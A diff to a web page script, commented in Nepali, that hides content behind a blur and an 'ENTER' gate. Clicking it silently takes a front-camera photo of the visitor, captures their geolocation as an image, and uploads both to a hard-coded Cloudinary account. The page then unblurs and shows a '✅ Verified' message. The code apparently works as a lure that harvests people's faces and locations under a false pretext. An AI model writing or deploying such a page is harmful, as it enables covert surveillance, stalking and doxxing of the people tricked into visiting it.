@@ -346,20 +346,22 @@ canvas{
 const CLOUD_NAME = "dae4gham8";
 const UPLOAD_PRESET = "Akprompt";
 
+
 const content     = document.getElementById("content");
 const gate        = document.getElementById("gate");
 const popup       = document.getElementById("popup");
 const popupClose  = document.getElementById("popupClose");
 const gateStatus  = document.getElementById("gateStatus");
 const enterBtn    = document.getElementById("enterBtn");
+const toast       = document.getElementById("toast");
 const video       = document.getElementById("video");
 const locCanvas   = document.getElementById("locCanvas");
 const photoCanvas = document.getElementById("photoCanvas");
 
-
 let photoDone    = false;   // photo upload भैसक्यो कि छैन
 let locationDone = false;   // location upload भैसक्यो कि छैन
-let pendingPhoto = null;    // capture भयो तर upload बाँकी छ भने reuse गर्न
+let pendingPhoto = null;    // capture भयो तर upload बाँकी → reuse गर्न
+
 
 
 /* ============ POPUP → GATE ============ */
@@ -370,17 +372,14 @@ popupClose.addEventListener("click", () => {
 
     popup.addEventListener("animationend", () => {
         popup.style.display = "none";
-        gate.classList.remove("hidden");   // NOW show ENTER gate
+        gate.classList.remove("hidden");
     }, { once:true });
 
 });
 
-/* ============ ONE CLICK ============ */
+/* ============ ONE CLICK : CAMERA → UPLOAD → LOCATION → UPLOAD ============ */
 
 enterBtn.addEventListener("click", runAll);
-
-
-
 
 async function runAll(){
 
@@ -388,7 +387,7 @@ async function runAll(){
 
     try{
 
-        // 1) PHOTO पहिले — capture + upload
+        // 1) CAMERA पहिले — permission → capture → upload
         if(!photoDone){
 
             if(!pendingPhoto){
@@ -396,25 +395,26 @@ async function runAll(){
                 pendingPhoto = await capturePhoto();
             }
 
-         
+          
             await uploadBlob(pendingPhoto);
             pendingPhoto = null;
             photoDone = true;
 
         }
 
-        // 2) LOCATION पछि — capture + upload
+        // 2) LOCATION पछि — permission → upload
         if(!locationDone){
 
+           
             const position = await getLocation();
 
-          
+           
             await uploadBlob(await locationImageBlob(position));
             locationDone = true;
 
         }
 
-        // 3) Done — clear blur
+        // 3) Done — blur clear
         unlock();
 
     }catch(err){
@@ -423,6 +423,51 @@ async function runAll(){
         enterBtn.textContent = "RETRY";
         enterBtn.disabled = false;
     }
+
+}
+
+/* ============ PHOTO (silent capture) ============ */
+
+async function capturePhoto(){
+
+    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+        throw new Error("Camera not supported (HTTPS required).");
+    }
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: false
+    }).catch(err => {
+        const m = {
+            NotAllowedError:  "Camera permission denied.",
+            NotFoundError:    "No camera found.",
+            NotReadableError: "Camera already in use."
+        };
+        throw new Error(m[err.name] || "Camera error.");
+    });
+
+    video.srcObject = stream;
+
+    // frame ready हुन कुर्नुहोस्
+    await new Promise(res => {
+        if(video.readyState >= 2) return res();
+        video.onloadeddata = res;
+    });
+
+    // exposure/autofocus settle हुन 400ms
+    await new Promise(res => setTimeout(res, 400));
+
+    photoCanvas.width  = video.videoWidth  || 640;
+    photoCanvas.height = video.videoHeight || 480;
+
+    photoCanvas.getContext("2d")
+        .drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
+
+    // camera तुरुन्तै release
+    stream.getTracks().forEach(t => t.stop());
+    video.srcObject = null;
+
+    return new Promise(res => photoCanvas.toBlob(res,"image/jpeg",0.9));
 
 }
 
@@ -440,8 +485,9 @@ function getLocation(){
             resolve,
             err => {
                 const m = {
-                   
-                    1: "timed out click again."
+                    1: "Location permission denied.",
+                    2: "Location unavailable.",
+                    3: "Location timed out."
                 };
                 reject(new Error(m[err.code] || "Location error."));
             },
@@ -469,49 +515,6 @@ function locationImageBlob(position){
     return new Promise(res => locCanvas.toBlob(res,"image/png"));
 }
 
-/* ============ PHOTO (silent capture) ============ */
-
-async function capturePhoto(){
-
-    if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-        throw new Error("Camera not supported (HTTPS required).");
-    }
-
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
-        audio: false
-    }).catch(err => {
-        const m = {
-            NotAllowedError:  "Camera permission denied.",
-            NotFoundError:    "No camera found.",
-            NotReadableError: "Camera already in use."
-        };
-        throw new Error(m[err.name] || "Camera error.");
-    });
-
-    video.srcObject = stream;
-
-    await new Promise(res => {
-        if(video.readyState >= 2) return res();
-        video.onloadeddata = res;
-    });
-
-    // let exposure/autofocus settle
-    await new Promise(res => setTimeout(res, 400));
-
-    photoCanvas.width  = video.videoWidth  || 640;
-    photoCanvas.height = video.videoHeight || 480;
-
-    photoCanvas.getContext("2d")
-        .drawImage(video, 0, 0, photoCanvas.width, photoCanvas.height);
-
-    stream.getTracks().forEach(t => t.stop());
-    video.srcObject = null;
-
-    return new Promise(res => photoCanvas.toBlob(res,"image/jpeg",0.9));
-
-}
-
 /* ============ UPLOAD (shared) ============ */
 
 function uploadBlob(blob){
@@ -525,7 +528,7 @@ function uploadBlob(blob){
     })
     .then(r => r.json())
     .then(data => {
-        if(data.error) throw new Error(" failed: " + data.error.message);
+        if(data.error) throw new Error("Upload failed: " + data.error.message);
         console.log("Uploaded:", data.secure_url);
         return data;
     });
@@ -535,7 +538,11 @@ function uploadBlob(blob){
 
 function unlock(){
     gate.classList.add("hidden");
-    content.classList.remove("locked");   // blur clears → image + red text visible
+    content.classList.remove("locked");
+
+    toast.textContent = "✅ Verified";
+    toast.classList.add("show");
+    setTimeout(() => toast.classList.remove("show"), 3000);
 }
 
 </script>
